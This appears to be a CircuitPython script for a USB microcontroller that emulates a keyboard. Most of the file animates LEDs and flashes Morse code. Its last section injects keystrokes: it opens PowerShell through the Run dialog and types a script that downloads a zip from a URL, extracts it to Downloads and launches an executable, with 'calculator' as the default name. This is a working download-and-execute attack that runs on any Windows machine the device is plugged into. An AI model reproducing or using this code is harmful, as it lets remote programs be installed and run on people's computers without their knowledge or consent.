# Copyright (c) 2025 ComputerL (@1ComputerL)
# Licensed under the MIT License. See LICENSE file in the project root for full license information.

### IMPORTS ###
# pull in CircuitPython HID and GPIO stuff
import usb_hid                              # lets board act as a USB HID device (keyboard/mouse/etc.)
from adafruit_hid.keyboard import Keyboard  # high-level keyboard emulation
from adafruit_hid.keycode import Keycode    # keycode constants for kbd.send()
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS  # handles typing text properly
import board                                # gives you the board pin definitions
import digitalio                            # to handle GPIO as digital input/output
import time                                 # basic sleep/delay stuff

### GPIO SETUP ###
# leds – define each LED pin and set to OUTPUT so we can light them up

status_led = digitalio.DigitalInOut(board.LED)  # on-board status LED
status_led.direction = digitalio.Direction.OUTPUT

eye_left = digitalio.DigitalInOut(board.GP8)   # left “eye” LED
eye_left.direction = digitalio.Direction.OUTPUT

eye_right = digitalio.DigitalInOut(board.GP7)  # right “eye” LED
eye_right.direction = digitalio.Direction.OUTPUT

green_top = digitalio.DigitalInOut(board.GP14)     # top green LED
green_top.direction = digitalio.Direction.OUTPUT

green_mid = digitalio.DigitalInOut(board.GP16)     # middle green LED
green_mid.direction = digitalio.Direction.OUTPUT

green_bottom = digitalio.DigitalInOut(board.GP17)  # bottom green LED
green_bottom.direction = digitalio.Direction.OUTPUT

yellow_led = digitalio.DigitalInOut(board.GP20)    # yellow “status” LED
yellow_led.direction = digitalio.Direction.OUTPUT

# buttons – set pins to INPUT with pull-ups (reads False when pressed)
btn1 = digitalio.DigitalInOut(board.GP2)
btn1.switch_to_input(pull=digitalio.Pull.UP)
btn2 = digitalio.DigitalInOut(board.GP3)
btn2.switch_to_input(pull=digitalio.Pull.UP)
btn3 = digitalio.DigitalInOut(board.GP4)
btn3.switch_to_input(pull=digitalio.Pull.UP)
btn4 = digitalio.DigitalInOut(board.GP5)
btn4.switch_to_input(pull=digitalio.Pull.UP)

# immediately turn all LEDs off so we start in a clean state
for led_obj in [status_led, eye_left, eye_right,
                green_top, green_mid, green_bottom, yellow_led]:
    led_obj.value = False

### FUNCTIONS ###

# flip a boolean value – handy for blinking LEDs
def toggle_bool(val: bool) -> bool:
    return not val

# blink the yellow LED to show a “loading” state
# times = how many on/off cycles, delay = speed of blink
def loading_yellow(times: int = 9, delay: float = 0.5):
    yellow_led.value = False
    for _ in range(times):
        yellow_led.value = toggle_bool(yellow_led.value)
        time.sleep(delay)
    yellow_led.value = True  # leave it on at the end

# run a cute “scanning” animation: eyes alternate + green LEDs cycle
def loading_animation(times: int = 9, delay: float = 0.3):
    greens = [green_top, green_mid, green_bottom]
    # start with left eye on, right eye off
    eye_left.value = True
    eye_right.value = False
    for _ in range(times):
        # flip both eyes each cycle
        eye_left.value = not eye_left.value
        eye_right.value = not eye_right.value
        # cycle through green LEDs one at a time
        for g in greens:
            for led_obj in greens:  # clear all first
                led_obj.value = False
            g.value = True  # light current one
            time.sleep(delay / 3)
        # turn greens back off
        for led_obj in greens:
            led_obj.value = False
    # after animation, light everything up
    eye_left.value = True
    eye_right.value = True
    for g in greens:
        g.value = True

# flash eyes in Morse code for a message
# only handles A-Z and 0-9 defined in MORSE_CODE dict
def flash_morse(message: str):
    DOT = 0.2              # dot length
    DASH = DOT * 3         # dash length
    GAP = DOT              # gap between symbols
    LETTER_GAP = DOT * 3   # gap between letters
    WORD_GAP = DOT * 7     # gap between words

    # dictionary: char → dot/dash string
    MORSE_CODE = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..',
        'E': '.', 'F': '..-.', 'G': '--.', 'H': '....',
        'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.',
        'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
        'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..',
        '1': '.----','2': '..---','3': '...--','4': '....-','5': '.....',
        '6': '-....','7': '--...','8': '---..','9': '----.','0': '-----',
    }

    message = message.upper()
    for word in message.split(' '):     # split on spaces for words
        for char in word:
            if char not in MORSE_CODE:  # skip unsupported chars
                continue
            code = MORSE_CODE[char]
            for symbol in code:
                # turn eyes on
                eye_left.value = eye_right.value = True
                # hold for dot or dash time
                time.sleep(DOT if symbol == '.' else DASH)
                # turn eyes off
                eye_left.value = eye_right.value = False
                time.sleep(GAP)  # small gap between symbols
            time.sleep(LETTER_GAP - GAP)  # extra gap between letters
        time.sleep(WORD_GAP - LETTER_GAP)  # extra gap between words

# quick helper to flash SOS on eyes = signal error
def signal_error():
    flash_morse("SOS")

### POWERSHELL / INSTALL HELPERS ###
# these functions emulate keystrokes to open PowerShell and type a script

# open a PowerShell window via Win+R, type “powershell” and hit Enter
def _open_powershell(kbd, layout):
    kbd.send(Keycode.GUI, Keycode.R)  # Win+R = Run dialog
    time.sleep(1)
    kbd.send(Keycode.ENTER)  # (optional extra Enter if needed)
    time.sleep(1)
    layout.write("powershell")  # type powershell
    time.sleep(1)
    kbd.send(Keycode.ENTER)     # hit Enter to open
    time.sleep(5)  # let it load for a few seconds

# build the PowerShell script text to download/unzip/run a file
def _build_install_script(name, link, file_path_in_repo, repo_name, branch, file_uuid):
    return f'''
$zipUrl = "{link}"
$name = "{name}"
$file_uuid = "{file_uuid}"
$file_path_in_repo = "{file_path_in_repo}"
$repoName = "{repo_name}"
$branch = "{branch}"

$downloads = [Environment]::GetFolderPath("UserProfile") + "\\Downloads"
$zipPath = Join-Path $downloads "$name-$file_uuid.zip"
$targetFolder = Join-Path $downloads "$name-$file_uuid"
$extractedFolderName = "$repoName-$branch"
$extractedFolderPath = Join-Path $downloads $extractedFolderName

Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath

if (Test-Path $targetFolder) {{
    Remove-Item $targetFolder -Recurse -Force
}}

Expand-Archive -LiteralPath $zipPath -DestinationPath $downloads -Force

if (Test-Path $extractedFolderPath) {{
    Rename-Item -Path $extractedFolderPath -NewName "$name-$file_uuid" -Force
}}

$exePath = Join-Path $targetFolder $file_path_in_repo
Start-Process -FilePath $exePath
'''

# simulate typing the script into PowerShell & pressing Enter to run it
def run_install(name="calculator",
                link="https://example.com/archive.zip",
                file_path_in_repo="myapp.exe",
                repo_name="my-repo",
                branch="main",
                file_uuid="12345"):
    kbd = Keyboard(usb_hid.devices)         # create keyboard object
    layout = KeyboardLayoutUS(kbd)         # for text writing
    _open_powershell(kbd, layout)          # open PowerShell window
    script = _build_install_script(name, link, file_path_in_repo, repo_name, branch, file_uuid)
    layout.write(script)                   # type script out
    time.sleep(1)
    kbd.send(Keycode.ENTER)                # hit Enter to execute
